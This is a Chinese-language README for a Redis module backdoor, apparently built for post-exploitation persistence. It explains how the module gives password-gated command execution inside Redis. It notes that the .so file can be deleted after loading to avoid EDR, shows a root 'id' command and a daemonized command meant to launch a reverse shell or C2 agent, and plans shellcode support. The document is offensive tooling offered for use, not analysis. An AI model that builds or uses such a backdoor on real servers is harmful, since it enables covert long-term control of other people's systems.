# redis-module-backdoor

基于 https://github.com/n0b0dyCN/RedisModules-ExecuteCommand 二开, 原项目代码写得有问题, 甚至写了sideof(buf)这种写法, 内存不安全. 二开是因为想要设计一个带有密码校验的, 甚至更多功能的"后门", 作为后渗透中权限维持工具使用. 这里选择使用sha256来存储密码, 不考虑加盐存储, 只要密码够复杂且没有暴露给cmd5过, 爆破不出来.

内存马等长期作为EDR监控的重点, 而ssh私钥等又太过于明显. redis作为防守方比较容易忽略的点, 拿来作为后门进行权限维持, 是一个比较不错的选择. 并且可以在加载后删掉so文件, 这样就只驻留在进程中.

命令执行的逻辑使用popen等, **仅限linux使用**

---

## 前台执行

system.exec是前台执行指令, base64编码后输出结果, redis-cli终端里不方便查看有换行和终端描述符的结果, 所以base64一下

stdout和stderr已经合并, 不用再2>&1

```shell
127.0.0.1:6379> system.exec "123" "id"
"dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCk="
```

**注意不要用来执行交互式或长时间挂起的指令, redis会阻塞, 导致业务完全崩溃**

## 后台执行

fork两次后执行, 守护化执行, 不会阻塞redis线程, 但是也没有回显

```shell
127.0.0.1:6379> system.dexec "123" "./tcp_linux_amd64"
OK
```

可以用来反弹shell或拉起c2

---

## TODO

- 增加shellcode执行支持
- 增加windows支持? (windows感觉没必要靠redis来维持权限了)
